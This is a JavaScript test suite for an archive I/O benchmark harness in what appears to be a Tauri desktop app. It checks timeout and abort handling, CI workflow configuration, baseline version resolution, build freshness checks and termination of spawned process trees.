  const abortReady = new Promise((resolve) => {
    abortStarted = resolve;
  });
  const abortGate = new Promise((resolve) => {
    finishAbort = resolve;
  });
  const run = withTimeout(
    operation,
    10,
    async () => {
      abortStarted();
      await abortGate;
    },
    1_000,
  );
  await abortReady;
  resolveOperation("late success");
  finishAbort();
  await assert.rejects(run, /exceeded its 10ms run timeout/);
});

test("archive benchmark timeout wins when a callback finishes after the deadline", async () => {
  const operation = new Promise((resolve) => {
    setTimeout(() => {
      // Simulate a blocking native callback: the operation resolves after the
      // deadline while JavaScript cannot dispatch the already-due timeout.
      Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 25);
      resolve("late success");
    }, 0);
  });
  const run = withTimeout(operation, 5, undefined, 100);

  await assert.rejects(run, /exceeded its 5ms run timeout/);
});

test("workflow Rust version matches the pinned toolchain", () => {
  const workflow = read(".github/workflows/ci.yml");
  assert.match(workflow, /RUST_VERSION:\s*["']1\.98\.1["']/);
  assert.match(workflow, /toolchain:\s*\$\{\{ env\.RUST_VERSION \}\}/);
  const rustCheckStart = workflow.indexOf("  rust-check:");
  const updaterStart = workflow.indexOf(
    "\n  updater-manifest:",
    rustCheckStart,
  );
  assert.match(
    workflow.slice(rustCheckStart, updaterStart),
    /components:\s*clippy/,
  );
});

test("accepted beta baseline is resolved and verified from candidate version", () => {
  const workflow = read(".github/workflows/ci.yml");
  const resolver = read("scripts/resolve-archive-io-baseline.mjs");
  assert.match(workflow, /node scripts\/resolve-archive-io-baseline\.mjs/);
  assert.match(workflow, /id: accepted-beta/);
  assert.match(resolver, /v\$\{packageVersion\}/);
  assert.match(resolver, /refs\/tags\/\$\{tag\}\^\{commit\}/);

  assert.deepEqual(
    resolveBetaBaseline("0.6.3-beta.2", () => "a".repeat(40)),
    { tag: "v0.6.3-beta.2", sha: "a".repeat(40) },
  );
  assert.throws(
    () => resolveBetaBaseline("0.6.3", () => "a".repeat(40)),
    /must be a beta version/,
  );
  assert.throws(
    () => resolveBetaBaseline("0.6.3-beta.2", () => null),
    /accepted beta tag v0.6.3-beta.2 is unavailable/,
  );
});

test("archive benchmark checkout ref agrees with candidate metadata", () => {
  const workflow = read(".github/workflows/ci.yml");
  const benchmarkStart = workflow.indexOf("  archive-io-benchmark:");
  const benchmarkJob = workflow.slice(
    benchmarkStart,
    workflow.indexOf("\n  archive-io-promotion-benchmark:", benchmarkStart),
  );
  const checkoutRef = checkoutStepRef(benchmarkJob);
  const candidateRef = benchmarkJob.match(
    /ZINNIA_BENCH_CANDIDATE_REF:\s*(\$\{\{[^\n]+\}\})/,
  )?.[1];
  const expectedRef =
    "${{ github.event_name == 'pull_request' && github.event.pull_request.head.sha || github.sha }}";

  assert.equal(checkoutRef, expectedRef);
  assert.equal(candidateRef, expectedRef);
  assert.match(benchmarkJob, /fetch-depth:\s*0/);
});

test("nightly archive benchmark covers all hosted architectures", () => {
  const workflow = read(".github/workflows/archive-io-benchmark.yml");
  assert.match(workflow, /cron: ['"]17 9 \* \* \*['"]/);
  assert.match(workflow, /workflow_dispatch:/);
  for (const runner of [
    "ubuntu-latest",
    "ubuntu-24.04-arm",
    "macos-26",
    "macos-26-intel",
    "windows-latest",
    "windows-11-arm",
  ]) {
    assert.match(workflow, new RegExp(`os: ${runner.replaceAll(".", "\\.")}`));
  }
  assert.match(
    workflow,
    /\n    timeout-minutes:\s*360\s*\n/,
    "release benchmark must retain the six-hour hosted-job budget",
  );
  assert.match(workflow, /retention-days: 90/);
  assert.match(workflow, /contents: read/);
  assert.doesNotMatch(workflow, /peter-evans\/create-pull-request/);
});

test("archive benchmark wrapper uses release persistent runner contract", () => {
  const script = read("scripts/run-archive-io-benchmark.mjs");
  const policy = read("scripts/archive-io-policy.mjs");
  const runner = read("e2e/helpers/archive-benchmark.js");
  assert.match(script, /buildProfile: "release"/);
  assert.match(script, /persistent: true/);
  assert.match(script, /excludeTransportTime: true/);
  assert.match(script, /runArchiveBenchmarkOperation/);
  assert.match(script, /GITHUB_STEP_SUMMARY/);
  assert.match(script, /failure \?\?= error/);
  assert.match(script, /ZINNIA_BENCH_RUN_TIMEOUT_MS/);
  assert.match(
    policy,
    /Archive benchmark exceeded its \$\{timeoutMs\}ms run timeout/,
  );
  assert.match(script, /new AbortController\(\)/);
  assert.match(script, /abortController\.abort\(\)/);
  assert.match(policy, /onTimeout\?\.\(error\)/);
  assert.match(policy, /Cancellation did not settle underlying benchmark/);
  assert.match(script, /assertBaselineReport/);
  assert.match(script, /assertComparedBaseline/);
  assert.match(script, /abort: session\?\.abort\?\.bind\(session\)/);
  assert.match(script, /const mergedEnv = \{ \.\.\.process\.env, \.\.\.env \}/);
  assert.match(script, /benchmarkCommandTimeoutMs\(mergedEnv\)/);
  assert.match(script, /RUSTUP_TOOLCHAIN: process\.env\.RUST_VERSION/);
  assert.match(script, /ZINNIA_BENCH_REQUIRE_BASELINE_REPORT/);
  assert.match(runner, /tauri/);
  assert.match(runner, /--features/);
  assert.match(runner, /"target",\s+"release"/);
  assert.match(runner, /ZINNIA_BENCH_SOCKET_PORT/);
  assert.match(
    runner,
    /const buildTimeoutMs = buildCommandTimeoutMs\(mergedEnv\)/,
  );
  assert.match(runner, /setTimeout\([\s\S]{0,300}buildTimeoutMs/);
  assert.match(runner, /ZINNIA_BENCH_BUILD_TIMEOUT_MS/);
  assert.match(runner, /Archive benchmark build command .*timed out after/);
  assert.match(runner, /detached:\s*process\.platform !== "win32"/);
  assert.match(runner, /taskkill/);
  assert.match(runner, /terminateProcessTree/);
  assert.match(runner, /signal\?\.addEventListener\("abort", onAbort/);
  assert.match(runner, /Archive benchmark runner was aborted before startup/);
});

test("archive benchmark E2E spec matches the persistent socket transport", () => {
  const spec = read("e2e/specs/archive-io-benchmark.spec.js");
  assert.match(spec, /node:net/);
  assert.match(spec, /net\.createConnection/);
  assert.match(spec, /ZINNIA_BENCH_SOCKET_HOST/);
  assert.match(spec, /ZINNIA_BENCH_SOCKET_PORT/);
  assert.match(spec, /ready:\s*true/);
  assert.match(spec, /message\.close\s*===\s*true/);
  assert.match(spec, /message\.id/);
  assert.match(spec, /runArchiveBenchmarkOperation/);
  assert.doesNotMatch(spec, /ZINNIA_BENCH_REQUESTS/);
});

test("archive benchmark smoke compares a base revision when available", () => {
  const workflow = read(".github/workflows/ci.yml");
  const benchmarkStart = workflow.indexOf("  archive-io-benchmark:");
  const benchmarkJob = workflow.slice(
    benchmarkStart,
    workflow.indexOf("\n  archive-io-promotion-benchmark:", benchmarkStart),
  );
  assert.match(benchmarkJob, /ZINNIA_BENCH_BASE_RUN:\s*["']?1["']?/);
  assert.match(benchmarkJob, /ZINNIA_BENCH_BASELINE_REF/);
});

test("baseline worktree recreates generated platform build inputs", () => {
  const script = read("scripts/run-archive-io-benchmark.mjs");
  assert.match(
    script,
    /if \(process\.platform === "win32"\) \{[\s\S]*?runCommand\([\s\S]*?"prepare:win-shell-stubs"[\s\S]*?\n    \}/,
  );
  assert.match(
    script,
    /ZINNIA_BENCH_REQUIRE_BASELINE_REPORT[\s\S]{0,120}Required baseline archive benchmark report is unavailable\./,
  );
});

test("release E2E helper refuses unstamped or stale production binaries", () => {
  const helper = read("e2e/helpers/archive-benchmark.js");
  assert.match(helper, /ARCHIVE_BENCHMARK_E2E_STAMP_VERSION/);
  assert.match(helper, /binarySha256/);
  assert.match(helper, /buildInputSha256/);
  assert.match(helper, /isArchiveBenchmarkE2eBinaryFresh/);
  assert.match(helper, /assertArchiveBenchmarkBuildInputsUnchanged/);
  assert.doesNotMatch(helper, /binaryMtimeMs|sourceMtimeMs|buildStartedAt/);
});

test("archive benchmark runner requirements remain role-specific", () => {
  const script = read("scripts/run-archive-io-benchmark.mjs");
  assert.match(
    script,
    /role === "baseline"\s*\? envFlag\("ZINNIA_BENCH_REQUIRE_BASELINE"\)/,
  );
  assert.match(
    script,
    /Baseline archive benchmark requires persistent release E2E runner; runner module not found\./,
  );
  assert.match(script, /metadata\.baselineUnavailable = true/);
  assert.match(script, /baselineRef && !baselineReport/);
});

test("release E2E freshness covers frontend and Tauri build inputs", () => {
  const helper = read("e2e/helpers/archive-benchmark.js");
  for (const input of [
    'path.join(REPO_ROOT, "public")',
    'path.join(REPO_ROOT, "assets")',
    'path.join(REPO_ROOT, "vite.config.ts")',
    'path.join(REPO_ROOT, "tsconfig.json")',
    'path.join(REPO_ROOT, "src-tauri", "build.rs")',
    'path.join(REPO_ROOT, "src-tauri", "tauri.conf.json")',
    'path.join(REPO_ROOT, "src-tauri", "tauri.linux.conf.json")',
    'path.join(REPO_ROOT, "src-tauri", "tauri.macos.conf.json")',
    'path.join(REPO_ROOT, "src-tauri", "tauri.windows.conf.json")',
    "const VENDORED_UPDATER_DIR = path.join(",
    '"tauri-plugin-updater",',
    "VENDORED_UPDATER_DIR,",
  ]) {
    assert.ok(helper.includes(input), `freshness list missing ${input}`);
  }
});

test("archive E2E timeout kills WDIO and descendant processes", async (t) => {
  const directory = mkdtempSync(join(tmpdir(), "zinnia-benchmark-tree-"));
  const pidFile = join(directory, "descendant.pid");
  let child;
  let descendantPid;
  t.after(() => {
    if (child?.pid) {
      try {
        process.kill(child.pid, "SIGKILL");
      } catch {}
    }
    if (descendantPid) {
      try {
        process.kill(descendantPid, "SIGKILL");
      } catch {}
    }
    rmSync(directory, { recursive: true, force: true });
  });

  const source = [
    'const { spawn } = require("node:child_process");',
    'const descendantSource = ["process.on(\\"SIGTERM\\", () => {});", "require(\\"node:fs\\").writeFileSync(process.env.ZINNIA_BENCH_TEST_PID_FILE, String(process.pid));", "setInterval(() => {}, 1000);"].join(" ");',
    'spawn(process.execPath, ["-e", descendantSource], { stdio: "ignore" });',
    "setInterval(() => {}, 1000);",
  ].join("\n");
  child = spawn(process.execPath, ["-e", source], {
    env: { ...process.env, ZINNIA_BENCH_TEST_PID_FILE: pidFile },
    stdio: "ignore",
    detached: process.platform !== "win32",
    windowsHide: true,
  });
  const childExit = waitForChild(child);
  childExit.catch(() => {});
  for (
    let attempt = 0;
    attempt < 100 && !readFileSyncExists(pidFile);
    attempt += 1
  ) {
    await delay(10);
  }
  assert.ok(
    readFileSyncExists(pidFile),
    "fixture child must launch a descendant",
  );
  descendantPid = Number(readFile(pidFile, "utf8"));

  await assert.rejects(
    waitForChildExit(childExit, child, 50),
    /did not exit after close request/,
  );
  await assertProcessStopped(child.pid);
  await assertProcessStopped(descendantPid);
});

test("package scripts expose benchmark and comparison entry points", () => {
  const packageJson = JSON.parse(read("package.json"));
  assert.equal(
    packageJson.scripts["benchmark:archive-io"],
    "node scripts/run-archive-io-benchmark.mjs",
  );
  assert.equal(
    packageJson.scripts["benchmark:archive-io:compare"],
    "node bench/archive-io/compare.mjs",
  );
});

test("link-bearing compatibility fixture requires real 7-Zip link metadata", () => {
  const benchmark = read("bench/archive-io/benchmark.mjs");
  assert.match(benchmark, /compatibility-links\.tar/);
  assert.match(benchmark, /["']-ttar["']/);
  assert.match(benchmark, /["']-snh["']/);
  assert.match(benchmark, /hasArchiveLinkMetadata\(listing\.stdout\)/);
  assert.match(
    benchmark,
    /Generated link-bearing compatibility fixture has no non-empty Hard Link or Symbolic Link metadata/,
  );
});

test("unsupported compatibility capabilities are explicit non-timing rows", () => {
  const benchmark = read("bench/archive-io/benchmark.mjs");
  assert.match(
    benchmark,
    /unavailableCompatibilityReport\(\s*"unsupported-filesystem"/s,
  );
  assert.match(benchmark, /unavailableCompatibilityReport\(\s*"custom-acl"/s);
  assert.match(benchmark, /status: "not-available"/);
  assert.match(benchmark, /target\/trend rollups/);
});
